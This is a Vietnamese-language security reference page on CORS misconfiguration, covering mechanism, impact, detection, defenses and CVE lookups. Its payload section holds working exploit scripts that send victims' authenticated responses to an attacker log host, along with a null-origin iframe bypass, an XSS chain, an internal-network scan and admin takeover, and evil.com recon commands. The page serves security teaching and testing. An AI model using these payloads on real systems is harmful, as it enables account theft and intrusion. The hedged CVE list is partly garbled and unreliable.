# CORS Misconfiguration

> Chính sách cross-origin quá rộng rãi cho phép một site độc hại đọc các phản hồi được bảo vệ. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/cors.md`](../../../../Troubleshooting_Guide/cors.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** A05:2021 Misconfiguration
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
CORS là cơ chế của trình duyệt cho phép một máy chủ chủ động chấp thuận để phản hồi của nó được
JavaScript từ một origin khác đọc. Một cấu hình sai CORS là một chính sách quá rộng rãi — thường là
tin tưởng origin của kẻ tấn công trong khi vẫn cho phép thông tin xác thực (credentials) — cho phép
một site độc hại đọc các phản hồi đã xác thực của nạn nhân.

## Cơ chế hoạt động (How it works)
Chính sách same-origin thông thường chặn việc đọc khác origin. CORS nới lỏng điều này qua header
`Access-Control-Allow-Origin` (ACAO). Nguy hiểm xuất hiện khi máy chủ phản chiếu bất kỳ `Origin` nào
nó nhận được (hoặc tin tưởng `null`, hoặc khớp origin bằng một regex lỏng lẻo) và đồng thời gửi
`Access-Control-Allow-Credentials: true`. Trang của kẻ tấn công khi đó phát một request khác origin
có kèm credentials; trình duyệt đính kèm cookie của nạn nhân, máy chủ trả về dữ liệu nhạy cảm, và vì
ACAO bằng với origin của kẻ tấn công, trình duyệt cho phép script của kẻ tấn công đọc nó. Lưu ý rằng
trình duyệt chặn `ACAO: *` kết hợp với credentials — việc khai thác đòi hỏi một origin cụ thể, do kẻ
tấn công kiểm soát, được cho phép.

## Tác động (Impact)
Đánh cắp bất kỳ dữ liệu nào mà phiên của nạn nhân có thể đọc (chi tiết tài khoản, khóa API, token
CSRF), thường dẫn tới chiếm tài khoản. CORS cũng có thể được nối chuỗi với CSRF để thay đổi trạng
thái khác origin, xoay trục (pivot) tới các ứng dụng nội bộ/admin tiếp cận được từ trình duyệt nạn
nhân, và bị lạm dụng cho cache poisoning khi ACAO được phản chiếu mà không có `Vary: Origin`. Mức độ
nghiêm trọng thường là cao.

## Cách phát hiện (How to detect)
- Gửi `Origin: https://evil.com` và quan sát phản hồi: ACAO phản chiếu origin của bạn (cùng với
  `Allow-Credentials: true`) là bằng chứng rõ ràng.
- `Origin: null` được chấp nhận (literal `null` được whitelist).
- Xác thực lỏng lẻo: khớp hậu tố/tiền tố/chuỗi con chấp nhận `evil.trusted.com`,
  `trusted.com.evil.com`, v.v.
- Thiếu `Vary: Origin` trên một ACAO được tính động (có thể cache), hoặc các subdomain `http://`
  được tin tưởng.

## Khai thác (tóm tắt) (Exploitation)
Xác nhận bốn điều kiện tiên quyết (credentials được phép, ACAO không phải `*`, ACAO phản chiếu/cho
phép origin của bạn, endpoint trả về dữ liệu nhạy cảm), rồi lưu trữ một trang phát một request
`withCredentials` và trích xuất phản hồi. Dùng một iframe sandbox cho các bypass origin `null`, mẹo
regex cho các bộ xác thực lỏng lẻo, và xoay trục qua XSS của một subdomain tin cậy hoặc qua mạng nội
bộ khi cần. Payload đầy đủ nằm trong mục Payload phía trên.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Điều kiện tiên quyết để khai thác (Exploit preconditions)
Một cấu hình sai CORS chỉ có thể khai thác để đánh cắp dữ liệu khi **tất cả** đều đúng:
1. `Access-Control-Allow-Credentials: true` (cookie được gửi)
2. `Access-Control-Allow-Origin` **không** phải `*` (trình duyệt chặn `*` với credentials)
3. `Access-Control-Allow-Origin` phản chiếu/bằng với origin của kẻ tấn công
4. endpoint trả về dữ liệu nhạy cảm, đọc được

### Phản chiếu Origin (Origin reflection)
Máy chủ lặp lại header `Origin` và cho phép credentials.
```javascript
var req = new XMLHttpRequest();
req.onload = function(){ location = "/log?key=" + encodeURIComponent(this.responseText); };
req.open("get", "https://TARGET/accountDetails", true);
req.withCredentials = true;
req.send();
```

### Bypass origin null (null-origin bypass)
Máy chủ whitelist literal `null`; tạo ra nó từ một iframe sandbox.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
  var req=new XMLHttpRequest();
  req.onload=function(){ location='https://EXPLOIT/log?key='+encodeURIComponent(this.responseText); };
  req.open('get','https://TARGET/accountDetails',true);
  req.withCredentials=true; req.send();
</script>"></iframe>
```

### Vượt regex xác thực Origin (Origin-validation regex bypasses)
```text
Origin: https://evil.trusted.com            # endsWith('.trusted.com')
Origin: https://trusted.com.evil.com         # startsWith('https://trusted.com')
Origin: https://evil.attacker.com.trusted.com
Origin: https://trusted.com.attacker.com     # naive dot/suffix match
```

### Nối chuỗi subdomain tin cậy + XSS (Trusted-subdomain + XSS chain)
Nếu bất kỳ subdomain nào (hoặc một subdomain `http://`) được tin tưởng, xoay trục qua XSS ở đó để đọc API.
```javascript
document.location =
  "http://stock.TARGET/?productId=4<script>" +
  "var req=new XMLHttpRequest();" +
  "req.onload=function(){location='https://EXPLOIT/log?key='+this.responseText;};" +
  "req.open('get','https://TARGET/accountDetails',true);" +
  "req.withCredentials=true;req.send();" +
  "<\/script>&storeId=1";
```

### Xoay trục mạng nội bộ (Internal-network pivot)
Một ứng dụng nội bộ tin tưởng, tiếp cận được từ trình duyệt nạn nhân, có thể bị quét và điều khiển theo từng giai đoạn.
```javascript
// Stage 1 — scan the internal range
var collab="https://EXPLOIT/log";
for (var i=1;i<=255;i++) (function(ip){
  fetch("http://192.168.0."+ip+":8080",{mode:'no-cors'})
    .then(()=>location=collab+"?ip=192.168.0."+ip).catch(()=>{});
})(i);

// Stage 2 — read the admin panel via CSRF-token-replay XSS
fetch("http://192.168.0.28:8080/login").then(r=>r.text()).then(t=>{
  var csrf=t.match(/csrf" value="([^"]+)"/)[1];
  location="http://192.168.0.28:8080/login?username=%22%3E%3Ciframe src=/admin onload=alert(this.contentWindow.document.body.innerHTML)%3E&password=x&csrf="+csrf;
});
// Stage 3 — submit an admin form (e.g. delete a user) the same way.
```

### Tấn công nối chuỗi / cache (Chained / cache attacks)
```javascript
// CORS + CSRF: state change with a JSON body cross-origin
fetch("https://TARGET/api/changeEmail",{method:"POST",credentials:"include",
  headers:{"Content-Type":"application/json"},body:JSON.stringify({email:"attacker@evil.com"})});
```
```bash
# Cache poisoning: if ACAO is reflected and Vary: Origin is missing, the CDN caches the
# attacker-origin response and serves it to later legitimate users.
curl -H "Origin: https://evil.com" https://TARGET/api/data
```

### Trinh sát (Recon)
```bash
curl -H "Origin: https://evil.com"  -I https://TARGET/api/endpoint   # reflection
curl -H "Origin: null"              -I https://TARGET/api/endpoint   # null whitelist
curl -H "Origin: http://sub.TARGET" -I https://TARGET/api/endpoint   # subdomain / protocol
curl -H "Origin: https://TARGET.evil.com" -I https://TARGET/api/endpoint  # suffix bypass
curl -H "Origin: https://evil.com.TARGET" -I https://TARGET/api/endpoint  # prefix bypass
curl -I https://TARGET/api/endpoint | grep -i vary                  # missing Vary: Origin = cacheable
```

| Header | Giá trị an toàn |
|--------|-------------|
| `Access-Control-Allow-Origin` | một origin HTTPS cụ thể (không bao giờ `*` với credentials) |
| `Access-Control-Allow-Credentials` | `true` chỉ khi đi kèm một origin tường minh |
| `Vary` | `Origin` mỗi khi ACAO được tính động |
| `Access-Control-Allow-Methods` / `-Headers` | tập tối thiểu cần thiết |

## Phòng chống (Defenses)
1. **Allowlist origin nghiêm ngặt** — xác thực `Origin` so với một tập tường minh các origin chính
   xác (scheme + host + port); không bao giờ phản chiếu origin tùy ý và không bao giờ tin tưởng `null`.
2. **Không kết hợp `*` với credentials**, và chỉ gửi `Access-Control-Allow-Credentials: true` cho
   các endpoint thực sự cần, đi kèm một origin tường minh duy nhất.
3. Dùng **so sánh chuỗi chính xác**, không phải `startsWith`/`endsWith`/regex, để các mẹo hậu tố/tiền
   tố thất bại.
4. Gửi **`Vary: Origin`** mỗi khi ACAO được tính động để ngăn cache poisoning.
5. Giữ `Access-Control-Allow-Methods`/`-Headers` ở mức tối thiểu, và tránh tin tưởng các origin nội
   bộ/anh em trừ khi chính chúng đã được bảo mật hoàn toàn.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=CORS+Misconfiguration
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=CORS+Misconfiguration
- **Exploit-DB** — https://www.exploit-db.com/search?q=CORS+Misconfiguration
- **GitHub Advisories** — https://github.com/advisories?query=CORS+Misconfiguration
- **OSV** — https://osv.dev/list?q=CORS+Misconfiguration
- **Cộng đồng** — r/netsec, blog bảo mật của nhà cung cấp, HackerOne Hacktivity, infosec trên X/Twitter.
- _Mẹo tìm kiếm: thêm sản phẩm + phiên bản mục tiêu, ví dụ `CORS Misconfiguration <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi trích dẫn._
- ngoài kiểu `CVE-2018-0269`, `CVE-2019-1003000` (Jenkins) và nhiều advisory Jenkins/Spring cho thấy
  các vấn đề CORS phản-chiếu-origin làm lộ dữ liệu API.
- `CVE-2017-0929` — cấu hình sai CORS trong DNN (DotNetNuke) cho phép truy cập dữ liệu khác origin.
- _Ví dụ kinh điển: vô số báo cáo bug-bounty giai đoạn 2016–2018 nhắm vào các API SaaS lớn đã phản
  chiếu `Origin` cùng credentials, cho phép đọc dữ liệu tài khoản đã xác thực._

## Tham khảo (References)
- PortSwigger Web Security Academy — Cross-origin resource sharing (CORS).
- OWASP — HTML5 Security / CORS guidance and the OWASP Cheat Sheet on origin handling.
- Fetch Standard (WHATWG) — CORS protocol; RFC 6454 — The Web Origin Concept.
